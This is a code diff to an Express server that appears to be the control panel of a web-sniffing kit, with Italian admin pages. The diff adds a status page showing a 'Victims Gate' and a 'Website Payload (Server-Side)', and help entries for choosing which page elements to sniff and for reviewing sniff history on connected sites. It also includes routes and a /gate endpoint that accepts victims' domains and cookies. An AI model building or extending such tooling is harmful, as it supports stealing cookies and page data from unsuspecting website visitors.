@@ -15,6 +15,7 @@ export class App {
   public generator:Generator;
   public loader:Loader;
   public eccipient: any;
+  public expose: any;
   public detectedIp: any;
   public salty: String;
     constructor() {
@@ -43,7 +44,7 @@ export class App {
                 }
                 this.generator.populate(JSON.parse(jsonString),this.salty);
                 this.eccipient = this.generator.init();
-                this.generator.endpoint();
+                this.expose = this.generator.endpoint();
                 this.start(this.conf.port,this.detectedIp);
             });
           } else {
@@ -55,34 +56,186 @@ export class App {
           res.send(this.eccipient);
         });
         app.get('/'+this.conf.licenseKey+'/status',(req,res)=>{
-          res.send('User: '+this.conf.instanceUser+'<br>'+
-                   'Port: '+this.conf.port+'<br>'+
-                   'Polling: '+this.conf.polling+'<br>'+
-                   'Sniffer: '+this.detectedIp+':'+this.conf.port+'/'+this.salty+'<br>'+
-                   'Victims Gate:'+this.detectedIp+':'+this.conf.port+'/gate');
+          let commonids='';
+          let commontags='';
+          let commonclasses='';
+          this.conf.documentids.forEach((id)=>{
+            commonids +='\''+id+'\','
+          });
+          this.conf.documentclasses.forEach((id)=>{
+            commonclasses +='\''+id+'\','
+          });
+          this.conf.documenttags.forEach((id)=>{
+            commontags +='\''+id+'\','
+          });
+          res.send(`<style>
+                               table {
+                                 font-family: arial, sans-serif;
+                                 border-collapse: collapse;
+                                 width: 100%;
+                               }
+                               td, th {
+                                 border: 1px solid #dddddd;
+                                 text-align: left;
+                                 padding: 8px;
+                               }
+                               tr:nth-child(even) {
+                                 background-color: #dddddd;
+                               }
+                           </style>
+                           <h2>STATUS Page</h2>
+                           <table>
+                           <tr>
+                           <th>Parametri</th>
+                           <th>Status</th>
+                           </tr>
+                           <tr>
+                           <td>User</td>
+                           <td>`+this.conf.instanceUser+`</td>
+                           </tr>
+                           <tr>
+                           <td>Port</td>
+                           <td>`+this.conf.port+`</td>
+                           </tr>
+                           <tr>
+                           <td>Start Date</td>
+                           <td>`+this.conf.initDate+`</td>
+                           </tr>
+                           <tr>
+                           <td>End Date</td>
+                           <td>`+this.conf.endDate+`</td>
+                           </tr>
+                           <tr>
+                           <td>Timer Polling</td>
+                           <td>`+this.conf.polling+`</td>
+                           </tr>
+                           <tr>
+                           <td>Sniffer Core</td>
+                           <td>`+this.detectedIp+':'+this.conf.port+'/'+this.salty+`</td>
+                           </tr>
+                           <tr>
+                           <td>Victims Gate</td>
+                           <td>`+this.detectedIp+':'+this.conf.port+'/gate'+`</td>
+                           </tr>
+                           <tr>
+                           <td>HTML Ids</td>
+                           <td>`+commonids.slice(0,-1)+`</td>
+                           </tr>
+                           <tr>
+                           <td>HTML Classes</td>
+                           <td>`+commonclasses.slice(0,-1)+`</td>
+                           </tr>
+                           <tr>
+                           <td>Tags</td>
+                           <td>`+commontags.slice(0,-1)+`</td>
+                           </tr>
+                           <tr>
+                           <td>Website Payload (Server-Side)</td>
+                           <td>`+'<xmp>'+this.expose+'</xmp>'+`</td>
+                           </tr>
+                           </table>
+                   `);
           res.end();
         });
         app.get('/'+this.conf.licenseKey+'/help',(req,res)=>{
-          res.send('Help Center page!'+'<br>'+
-                   '/licenseKey/help  '+'Ritorna questa pagina'+'<br>'+
-                   '/licenseKey/status  '+'Visualizza una panoramica dei parametri'+'<br>'+
-                   '/licenseKey/restart  '+'Riavvia il server'+'<br>'+
-                   '/licenseKey/common/list  '+'Visualizza una lista di tutti gli elementi di pagina impostati'+'<br>'+
-                   '/licenseKey/tags/add/nometag  '+'Aggiunge un nuovo tag html sniffabile'+'<br>'+
-                   '/licenseKey/ids/add/nomeid  '+'Aggiunge un nuovo id html sniffabile'+'<br>'+
-                   '/licenseKey/classes/add/nomeclasse  '+'Aggiunge una nuova classe html sniffabile'+'<br>'+
-                   '/licenseKey/tags/remove/nometag  '+'Rimuove un tag html precedentemente impostato'+'<br>'+
-                   '/licenseKey/ids/remove/nomeid  '+'Rimuove un id html precedentemente impostato'+'<br>'+
-                   '/licenseKey/classes/remove/nomeclasse  '+'Rimuove una classe html precedentemente impostata'+'<br>'+
-                   '/licenseKey/polling/modify/num  '+'Modifica il tempo di comunicazione in secondi dello sniffer'+'<br>'+
-                   '/licenseKey/payloads/htmlpage  '+'Ritorna in base64 il codice da inserire nel sito vittima funzionamento server-side'+'<br>'+
-                   '/licenseKey/payloads/crossbrowser  '+'Ritorna in base64 il codice ed il loader da inviare alle vittime funzionamento client-side'+'<br>');
-          res.end();
+          res.send(`<style>
+                      table {
+                        font-family: arial, sans-serif;
+                        border-collapse: collapse;
+                        width: 100%;
+                      }
+                      td, th {
+                        border: 1px solid #dddddd;
+                        text-align: left;
+                        padding: 8px;
+                      }
+                      tr:nth-child(even) {
+                        background-color: #dddddd;
+                      }
+                  </style>
+                  <h2>HELP Page</h2>
+                  <table>
+                  <tr>
+                  <th>Restapi Link</th>
+                  <th>Descrizione</th>
+                  </tr>
+                  <tr>
+                  <td>/licenseKey/help</td>
+                  <td>Ritorna questa pagina</td>
+                  </tr>
+                  <tr>
+                  <td>/licenseKey/status</td>
+                  <td>Visualizza una panoramica dei parametri</td>
+                  </tr>
+                  <tr>
+                  <td>/licenseKey/restart</td>
+                  <td>Riavvia il server</td>
+                  </tr>
+                  <tr>
+                  <td>/licenseKey/tags/add/nometag</td>
+                  <td>Aggiunge un nuovo tag html sniffabile</td>
+                  </tr>
+                  <tr>
+                  <td>/licenseKey/ids/add/nomeid</td>
+                  <td>Aggiunge un nuovo id html sniffabile</td>
+                  </tr>
+                  <tr>
+                  <td>/licenseKey/classes/add/nomeclasse</td>
+                  <td>Aggiunge una nuova classe html sniffabile</td>
+                  </tr>
+                  <tr>
+                  <td>/licenseKey/tags/remove/nometag</td>
+                  <td>Rimuove un tag html precedentemente impostato</td>
+                  </tr>
+                  <tr>
+                  <td>/licenseKey/ids/remove/nomeid</td>
+                  <td>Rimuove un id html precedentemente impostato</td>
+                  </tr>
+                  <tr>
+                  <td>/licenseKey/classes/remove/nomeclasse</td>
+                  <td>Rimuove una classe html precedentemente impostata</td>
+                  </tr>
+                  <tr>
+                  <td>/licenseKey/polling/modify/num</td>
+                  <td>Modifica il tempo di comunicazione in secondi dello sniffer</td>
+                  </tr>
+                  <tr>
+                  <td>/licenseKey/history/list</td>
+                  <td>Ritorna uno storico riguardante le operazioni di sniff sui vari siti a cui è collegato</td>
+                  </tr>
+                  <tr>
+                  <td>/licenseKey/history/clear</td>
+                  <td>Cancella lo storico relativo alle operazioni di sniff sui vari siti a cui è collegato</td>
+                  </tr>
+                  </table>`);
+        res.end();
         });
         app.get('/'+this.conf.licenseKey+'/restart',(req,res)=>{
 	           process.exit(1);
              res.end();
         });
+        app.get('/'+this.conf.licenseKey+'/tags/add/:tagname',(req,res)=>{
+             res.end();
+        });
+        app.get('/'+this.conf.licenseKey+'/tags/remove/:tagname',(req,res)=>{
+             res.end();
+        });
+        app.get('/'+this.conf.licenseKey+'/ids/add/:idsname',(req,res)=>{
+             res.end();
+        });
+        app.get('/'+this.conf.licenseKey+'/ids/remove/:idsname',(req,res)=>{
+             res.end();
+        });
+        app.get('/'+this.conf.licenseKey+'/classes/add/:classname',(req,res)=>{
+             res.end();
+        });
+        app.get('/'+this.conf.licenseKey+'/classes/remove/:classname',(req,res)=>{
+             res.end();
+        });
+        app.get('/'+this.conf.licenseKey+'/polling/modify/:interval',(req,res)=>{
+             res.end();
+        });
+
         app.post('/gate',(req,res)=>{
           if (req.body.domain === null && req.body.cookie === null){
             this.logger.alertMessage(req);
